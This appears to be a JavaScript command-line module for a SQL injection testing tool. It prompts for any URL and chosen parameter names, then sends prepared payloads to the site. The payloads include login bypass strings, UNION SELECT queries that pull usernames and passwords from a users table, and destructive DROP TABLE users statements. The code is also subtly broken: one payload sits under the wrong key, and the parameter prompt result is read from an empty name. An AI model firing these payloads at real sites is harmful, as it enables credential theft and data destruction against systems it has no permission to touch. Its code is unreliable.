import inquirer from "inquirer";
import ora from "ora";
import checkSQLInjection from "../../tools/checkSQLInjection.js";
import chalk from "chalk";

const PARAMETERS = [
  {
    type: 'Login',
    options: [
      'username',
      'password'
    ],
    value: "' OR '1'='1 -- "
  },
  {
    type: 'Search',
    options: [
      'search',
      'query',
      'q'
    ],
    value: "' OR 1=1 -- "
  },
  {
    type: 'Filter',
    options: [
      'category',
      'product',
      'type',
      'filter'
    ],
    value: " UNION SELECT username, password FROM users -- "
  },
  {
    type: 'Identification',
    options: [
      'id',
      'user_id',
      'product_id',
      'order_id'
    ],
    value: "1 OR 1=1 --"
  },
  {
    type: 'Pagination',
    options: [
      'page',
      'limit',
      'offset'
    ],
    value: "1 UNION SELECT null, username, password FROM users --"
  },
  {
    type: 'Date',
    options: [
      'date',
      'start_date',
      'end_date',
      'from',
      'to'
    ],
    pagination: "' UNION SELECT username, password FROM users -- "
  },
  {
    type: 'Sort',
    options: [
      'order',
      'sort',
      'order_by'
    ],
    value: "name; DROP TABLE users -- "
  },
  {
    type: 'Register',
    options: [
      'email',
      'address',
      'phone',
      'profile'
    ],
    value: "john@example.com'); DROP TABLE users; --"
  },
  {
    type: 'Session',
    options: [
      'token',
      'session',
      'auth'
    ],
    value: "' UNION SELECT username, password FROM users --"
  }
];

let url = "";

function getParams(params = []) {
  return params.map(param => {
    return {
      name: param,
      value: PARAMETERS.filter(p => p.options.includes(param))[0].value
    }
  })
}

export default function sqlInjection() {
  inquirer.prompt([
    {
      type: 'input',
      name: "url",
      message: "URL:"
    }
  ]).then((result) => {
    url = result.url;
    inquirer.prompt([
      {
        type: 'checkbox',
        message: 'Parameters',
        choices: [...PARAMETERS.map(param => [new inquirer.Separator(`> ${param.type.toUpperCase()} <`), ...param.options.map(option => { return { name: option, value: option }})])].flatMap(item => item)
      }
    ]).then(result => {
      const parameters = result['']
      
      const spinner = ora(`Executin SQL Injection on ${url} with ${parameters.length} parameters...`).start();

      checkSQLInjection(url, getParams(parameters))
        .then(res => {
          
          if (res.type === 'success') spinner.succeed(chalk.greenBright(res.message));          
          if (res.type === 'warning') spinner.succeed(chalk.yellowBright(res.message));
          if (res.type === 'error') spinner.succeed(chalk.redBright(res.message));
        })
        .catch(err => {
          spinner.warn('Error on request: ' + err.message);
        })
    })
  });
}
